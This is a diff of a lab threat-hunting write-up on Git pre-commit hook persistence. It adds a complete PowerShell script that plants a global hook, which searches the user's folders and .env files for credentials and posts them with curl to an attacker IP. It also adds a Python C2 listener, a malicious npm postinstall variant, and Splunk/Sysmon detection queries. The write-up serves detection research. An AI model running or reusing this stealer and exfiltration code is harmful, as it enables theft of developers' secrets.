@@ -30,9 +30,9 @@ This hunt maps to MITRE ATT&CK `T1546` because the pre-commit hook executes auto
 
 | Machine | OS | IP | Role |
 |---|---|---|---|
-| Kali Linux | Kali Linux | 192.168.37.132 | Attacker |
+| Kali Linux | Kali Linux | 192.168.37.132 | Attacker, however in this context, it was simply used to create the script to be hosted on github and act as a c2 |
 | Victim | Windows 11 | 192.168.37.130 | Victim (Git + Sysmon) |
-| Splunk | - | - | SIEM |
+| Splunk | Ubuntu Server | 192.168.37.129 | SIEM |
 
 ### Attack Simulation
 
@@ -41,49 +41,154 @@ The attack was simulated manually as no Atomic Red Team test exists for this tec
 **Step 1 — Attacker setup**
 
 A malicious PowerShell script (`setup.ps1`) was hosted on a GitHub Gist. This script:
-- Creates `C:\ProgramData\.git-hooks\` as a centrally hosted hooks directory
-- Writes a malicious `pre-commit` hook file to that directory
-- Sets `core.hooksPath` in the victim's global Git config to point to the attacker-controlled directory
+- Creates `C:\ProgramData\.git-hooks\` as a centrally controlled hooks directory outside of any individual repository
+- Writes a malicious `pre-commit` hook file to that directory containing logic to collect system information, scan for credential files on the victim's Desktop, Documents and Downloads, extract matching content, and exfiltrate everything via HTTP POST to the attacker's C2
+- Sets `core.hooksPath` in the victim's global Git config to point to the attacker-controlled directory, ensuring the hook fires silently on every future commit across all of the victim's repositories
+- Prints `Assessment complete.` and exits, the victim sees nothing suspicious and the script never touches disk.
+
+**Setup.ps1 Script**
+```
+$hookDir = "C:\ProgramData\.git-hooks"
+New-Item -ItemType Directory -Path $hookDir -Force | Out-Null
+
+$hook = @'
+#!/bin/sh
+
+# ── System Info ──────────────────────────────
+HOST=$(hostname)
+USER=$(whoami)
+REPO=$(git rev-parse --show-toplevel 2>/dev/null)
+BRANCH=$(git branch --show-current 2>/dev/null)
+GIT_USER=$(git config user.email 2>/dev/null)
+
+# ── Credential File Search ───────────────────
+CRED_FILES=$(grep -rli \
+  -E "password|api_key|secret|token|aws_access|DB_PASSWORD|STRIPE|GITHUB_TOKEN" \
+  "$USERPROFILE/Desktop" \
+  "$USERPROFILE/Documents" \
+  "$USERPROFILE/Downloads" \
+  2>/dev/null | head -10)
+
+# ── Pull Content from Found Files ────────────
+CRED_CONTENT=""
+for f in $CRED_FILES; do
+  CRED_CONTENT="$CRED_CONTENT
+--- $f ---
+$(grep -iE "password|api_key|secret|token|aws_access|DB_PASSWORD|STRIPE|GITHUB_TOKEN" "$f" 2>/dev/null | head -10)"
+done
+
+# ── ENV File Content ─────────────────────────
+ENV_CONTENT=$(find "$USERPROFILE" -name ".env" 2>/dev/null \
+  -exec grep -iE "password|key|secret|token" {} \; \
+  2>/dev/null | head -20)
+
+# ── Build Payload ────────────────────────────
+PAYLOAD="
+=== SYSTEM INFO ===
+host=$HOST
+user=$USER
+git_user=$GIT_USER
+repo=$REPO
+branch=$BRANCH
+
+=== CREDENTIAL FILES FOUND ===
+$CRED_CONTENT
+
+=== ENV FILE CONTENTS ===
+$ENV_CONTENT
+"
+
+
+# ── Exfil ────────────────────────────────────
+echo "$PAYLOAD" | curl -s -X POST http://192.168.37.132:8080/upload \
+  --data-binary @- 2>/dev/null
+'@
+
+[System.IO.File]::WriteAllText("$hookDir\pre-commit", $hook.Replace("`r`n","`n"))
+git config --global core.hooksPath $hookDir
+Write-Host "Assessment complete."
+```
 
 A fake C2 listener was started on Kali to receive exfiltrated data:
 
 ```bash
 python3 c2.py
 ```
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from datetime import datetime
 
-**Step 2 — Social engineering delivery**
+class Handler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers['Content-Length'])
+        data = self.rfile.read(length)
+        print(f"\n[{datetime.now()}] *** DATA RECEIVED ***")
+        print(data.decode())
+        self.send_response(200)
+        self.end_headers()
 
-The victim was social engineered into running the following PowerShell one-liner, disguised as a developer audit script:
+    def log_message(self, format, *args):
+        pass
 
-```powershell
-IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/...')
+print("[*] Fake C2 listening on 0.0.0.0:8080...")
+HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
 ```
 
-The script ran entirely in memory (fileless delivery). The victim saw only:
+- `HTTPServer('0.0.0.0', 8080)` binds to all network interfaces on port 8080, accepting connections from any machine on the network
+- `do_POST` handles incoming HTTP POST requests — this is the method the pre-commit hook uses to deliver stolen data via `curl`
+- `self.headers['Content-Length']` reads the size of the incoming data, then `self.rfile.read(length)` reads the full payload body
+- `data.decode()` converts the raw bytes to readable text and prints it to the terminal with a timestamp, displaying the exfiltrated credentials and system information
+- `self.send_response(200)` returns an HTTP 200 OK to the victim machine so `curl` exits cleanly with no errors — keeping the hook silent
+- `log_message` is overridden to suppress the default HTTP request logs, keeping the terminal output clean and showing only the received data
+- `serve_forever()` keeps the server running continuously, ready to receive data from every subsequent commit the victim makes
 
-```
-Assessment complete.
+
+
+
+**Step 2 — Social engineering delivery, User running "Audit script"**
+
+> **Note:** While this test describes a user being socially engineered, resulting in running a powershell command, the same persistence mechanism can be achieved through several other attack vectors that require no direct user interaction beyond normal developer activity.
+
+**Alternative Delivery — Malicious npm Package**
+
+A threat actor could publish a malicious npm package containing a `postinstall` script that plants the hook automatically when a developer runs `npm install`:
+
+```json
+{
+  "scripts": {
+    "postinstall": "powershell -c \"New-Item -Path C:\\ProgramData\\.git-hooks -Force; git config --global core.hooksPath C:\\ProgramData\\.git-hooks\""
+  }
+}
 ```
 
-![IEX lure executed](screenshots/01-iex-lure-powershell.png)
+- The developer never runs anything suspicious directly, installing any project dependency that includes or depends on the malicious package is enough to trigger the hook installation silently.
+
+**Why This Matters**
+
+In all cases the end result is identical, `core.hooksPath` is set globally and the pre-commit hook fires on every future commit. The delivery method only affects which event triggers the installation. This makes the technique particularly difficult to attribute, as the hook may be planted long before the first suspicious commit activity is observed in Sysmon.
+
+
+
+![IEX lure executed](screenshots/Iexranbyvictim.png)
+
+- As we can see, from the users end, they simply observed a assessment complete output, nothing else. for e.g, this could be made more realistic by providing fake output of checking dependencies.
 
 **Step 3 — Hook triggered**
 
-A Git commit was made in the victim's development project. The pre-commit hook fired silently before the commit completed:
+A Git commit was made in the victim's development project. The pre-commit hook fired silently before the commit completed. Git read the global core.hooksPath setting and executed the local script at C:\ProgramData\.git-hooks\pre-commit, which had been written to disk during the initial IEX delivery.
 
-```powershell
-cd C:\Users\Adam\projects\webapp
-echo "update" >> app.js
-git add .
-git commit -m "add new feature"
-```
+![Hook Triggered](screenshots/gitcommitperformedbydev.png)
 
-The hook scanned the victim's Desktop, Documents, and Downloads for files containing credential-related keywords, and exfiltrated the findings to the attacker's C2.
+The hook scanned the victim's Desktop, Documents, and Downloads for files containing credential related keywords, and exfiltrated the findings to the attacker's C2. In this case my Kali linux host. 
 
-![C2 data received](screenshots/02-c2-data-received.png)
+**Results**
+
+![C2 data received](screenshots/c2recievesdata.png)
+
+- For the purpose of this write up only the relevant findings are shown. In practice the hook returned a number of false positives, including DFIR tooling and Sysmon CSV exports on the Desktop which matched on keywords such as `token` and `password` appearing within XML field names and tool documentation. This is intentional from an attacker's perspective,broader regex patterns are preferable to narrow ones, as missing a genuine credential is a worse outcome than reviewing additional noise. In a real intrusion, the attacker would manually review the full output and filter for anything of value, meaning false positives add little friction while increasing the chance of capturing something useful.
 
 
-## Hunting for Git Hook Persistence with Sysmon
+# Hunting for Git Hook Persistence with Sysmon
 
 ### Event ID 4104 — PowerShell Script Block (Initial Delivery)
 
@@ -106,16 +211,17 @@ index=powershell earliest=-60m
 
 **Results**
 
-![Splunk Event 4104](screenshots/03-splunk-event-4104.png)
+![Splunk Event 4104](screenshots/4104outputcapturinginitialwritingoffilepng.png)
 
+- Here we can obseve the Command ran by the dev at 2026-06-03 03:09:25.696, and the running of git hooks
 - The script block captured by Event ID 4104 showed the full content of the malicious PowerShell script executing in memory, including the creation of the `.git-hooks` directory and the `git config --global core.hooksPath` command
-- This is the loudest point of the attack — fileless delivery still gets logged here because PowerShell script block logging captures what the engine executes, regardless of how it was delivered
+- This is the loudest point of the attack, fileless delivery still gets logged here because PowerShell script block logging captures what the engine executes, regardless of how it was delivered
 - Another win for PowerShell script block logging :D
 
 
 ### Event ID 11 — File Creation (Hook Planted and gitconfig Modified)
 
-After the script ran in memory, two key files were written to disk. Sysmon Event ID 11 captures file creation and modification events.
+After the script ran in memory, two key files were written to disk. Sysmon Event ID 11 captures file creation and overwrite events, not general file modification events
 
 ```spl
 index=sysmon EventCode=11 earliest=-60m
@@ -132,9 +238,14 @@ index=sysmon EventCode=11 earliest=-60m
 
 **Results**
 
-![Splunk Event 11](screenshots/04-splunk-event-11.png)
+- No results for the above query, lets investigate why
 
-Two key events were observed:
+![Splunk Event 11](screenshots/screenshotsEventid11nothingobservedcuzofgapinsysmon.png)
+
+- Making the query more broad we can clearly see after the malcious powershell command was executed at 03:09:25.696, no surrounding events were observed for file creation of the git-hooks/ pre commit files
+- Sysmon Event ID 11 FileCreate monitoring uses `ruledefault="exclude"`, meaning only paths explicitly listed in the Sysmon configuration are monitored. The default configuration did not include `C:\ProgramData\` or `.gitconfig` paths, so the hook file creation and gitconfig modification were not captured by Event ID 11 despite Sysmon being active on the endpoint.
+
+Two key events should be observed:
 
 **pre-commit file created**
 ```
@@ -143,12 +254,18 @@ C:\ProgramData\.git-hooks\pre-commit
 - The pre-commit hook was written to `C:\ProgramData\.git-hooks\` — a location completely outside any individual Git repository
 - Legitimate Git hooks live inside `.git\hooks\` within a specific project. A pre-commit file appearing in `ProgramData` is highly suspicious and has no legitimate developer use case
 
-**gitconfig modified**
+**gitconfig.lock created**
 ```
 C:\Users\Adam\AppData\Local\Programs\Git\etc\gitconfig
 ```
-- This is the system-level Git config for Git for Windows installed in the user's AppData — it applies to all of the user's Git operations
+- This is the system level Git config for Git for Windows installed in the user's AppData, it applies to all of the user's Git operations
 - The modification was confirmed via the lock-file-to-rename pattern in the USN journal: `.gitconfig.lock` created → data added → renamed to `.gitconfig`, which is Git's atomic write behaviour
+
+### MFT/USN Journal — Using forensic artefacts to show the file created/rename events
+
+
+
+
 
 
 ### Event ID 1 — Process Creation (Hook Execution Chain)
